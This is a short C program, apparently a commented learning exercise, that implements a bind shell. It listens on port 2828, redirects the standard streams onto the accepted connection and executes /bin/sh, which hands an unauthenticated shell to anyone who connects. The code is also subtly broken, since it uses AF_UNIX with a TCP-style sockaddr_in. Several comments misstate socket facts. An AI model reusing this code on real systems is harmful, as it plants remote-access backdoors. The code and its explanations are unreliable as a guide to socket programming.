#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(){
    int socketfd = socket(AF_UNIX,SOCK_STREAM,0);
    // See man socket
    // AF_UNIX = local communication
    // SOCK_STREAM = TCP Communication. UDP = SOCK_DGRAM
    // Protocol = see man protocol. 0 = IP.
    if (socketfd < 0){
        puts("Creation of socket is failed!");
        return -1;
    }
    struct sockaddr_in server_address;
    // require netinet/in.h
    // used to handle internet address.
    // see https://man7.org/linux/man-pages/man3/sockaddr.3type.html#LIBRARY
    server_address.sin_family = AF_UNIX;
    // socket protocol family = AF_UNIX since its TCP, UDP, ETC family.
    server_address.sin_addr.s_addr = INADDR_ANY;
    // see man 7 ip.
    // socket will bind to all local interface.
    server_address.sin_port = htons(2828);
    // htons used to convert port value to network byte order.
    if (bind(socketfd, (struct sockaddr *) &server_address,sizeof(server_address)) < 0){
        puts("Socket binding is failed!");
        return -1;
    }
    // see man bind.
    // this systemcall used to bind address into the socket.
    // change the type into struct pointer of sockaddr which have memory address of server_address.
    // third parameter is lenght of struct sockaddr, which is length of server_address.
    // if it return -1, its having error.
    if (listen(socketfd,0) < 0){
        puts("Listen process is failed!");
        return -1;
    }
    // see man listen.
    // this systemcall used to accept incoming connection.
    // second parameter of listen is max length of queue of pending connection.
    int acceptfd = accept(socketfd, NULL, NULL);
    if ( acceptfd < 0){
        puts("Listen process is failed!");
    }
    // see man accept.
    // the parameter is same as listen.
    // this systemcall used to extract first connection request on queue of pending connection for listen socket.
    for (int i = 0; i < 3; i++)
    {
        dup2(acceptfd,i);
        // see man dup2.
        // duplicate file descriptor of accept. (Need unistd.h)
    }

    execve("/bin/sh",NULL,NULL);
    // see man execve
    // execute program.
    
    return 0;
}